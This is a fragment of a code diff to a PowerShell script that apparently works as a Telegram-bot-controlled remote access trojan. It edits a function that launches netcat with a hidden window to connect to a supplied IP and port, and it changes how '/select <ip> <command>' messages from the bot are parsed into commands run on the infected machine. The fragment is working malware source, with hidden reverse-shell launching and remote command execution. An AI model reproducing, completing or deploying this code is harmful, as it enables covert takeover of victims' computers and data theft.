@@ -536,7 +536,7 @@ function netcat($ip, $port) {
     Start-Sleep -Seconds 5
     Send-Message "Connecting.."
     Send-Message "IP:$ip"
-    Send-Message "Port:8888"
+    Send-Message "Port:$port"
     Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
 }
 
@@ -660,7 +660,8 @@ While ($DoNotExit)  {
 	Switch -Wildcard ($LastMessageText)  {
 	  "/select $ipV4 *"  { #Important: run with a space
 	    #The user wants to run a command
-		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
+		#$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
+                $CommandToRun = $LastMessageText -replace "/select $ipV4 ", ""
 		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
 		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
 		
